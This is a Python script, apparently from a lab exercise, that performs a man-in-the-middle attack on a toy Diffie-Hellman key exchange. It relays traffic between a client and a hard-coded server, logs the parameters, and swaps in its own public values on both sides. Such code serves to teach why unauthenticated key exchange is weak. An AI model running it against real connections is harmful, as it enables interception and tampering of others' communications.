import socket
import random

def mitm_server(listen_ip, listen_port, target_ip, target_port):
    """
    Man-in-the-Middle server to intercept and modify Diffie-Hellman key exchange.
    """
    try:
        # Set up the MiM server to listen for the client
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mitm_server:
            mitm_server.bind((listen_ip, listen_port))
            mitm_server.listen(1)
            print(f"MiM server listening on {listen_ip}:{listen_port}...")

            # Accept connection from the client
            client_socket, client_addr = mitm_server.accept()
            print(f"Client connected: {client_addr}")

            # Connect to the legitimate target server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as target_socket:
                target_socket.connect((target_ip, target_port))
                print("Connected to the legitimate target server.")

                # Relay messages between client and server
                    # Intercept data from the client
                entry_number = client_socket.recv(1024)
                if not entry_number:
                    print("Error reading entry number from client.")
                    return None
                print(f"Entry Number from client: {entry_number.decode()}")

                # Modify the data if needed (example: log it, change values, etc.)
                modified_client_data = entry_number  # Modify if necessary
                print(f"Forwarding to server: {modified_client_data.decode()}")
                target_socket.sendall(modified_client_data)

                # Intercept data from the server
                server_data = target_socket.recv(1024)
                if not server_data:
                    print("Error reading data from server.")
                    return None
                print(f"P,G from server: {server_data.decode()}")
                P,G=map(int,server_data.decode().split(','))
                # Modify the data if needed (example: change keys, etc.)
                a,b = random.randint(0, P-1),random.randint(0, P-1)
                print(f"Malicious private keys: a={a},b={b}")
                modified_server_data = server_data  # Modify if necessary
                print(f"Forwarding P,G to client: {modified_server_data.decode()}")
                client_socket.sendall(modified_server_data)

                client_secret = client_socket.recv(1024)
                if not client_secret:
                    print("Error reading secret key from client.")
                    return None
                print(f"Intercepted encrypted message from client: {client_secret.decode()}")

                    # Modify the data if needed (example: log it, change values, etc.)
                modified_client_data = pow(G,a,P)  # Modify if necessary
                print(f"Forwarding malicious message to server: {(modified_client_data)}")
                target_socket.sendall(str(modified_client_data).encode())

                server_secret = target_socket.recv(1024)
                if not server_secret:
                    print("Error reading secret key from server.")
                    return None
                print(f"Intercepted encrypted message from server: {server_secret.decode()}")
                
                modified_server_data=pow(G,b,P)
                print(f"Forwarding malicious message to client: {modified_server_data}")
                client_socket.sendall(str(modified_server_data).encode())



    except Exception as e:
        print(f"An error occurred in MiM server: {e}")

if __name__ == "__main__":
    listen_ip = "127.0.0.1"  # MiM server's IP
    listen_port = 5555      # MiM server's listening port
    target_ip = "10.237.27.193" # Legitimate server's IP
    target_port = 5555     # Legitimate server's port

    mitm_server(listen_ip, listen_port, target_ip, target_port)
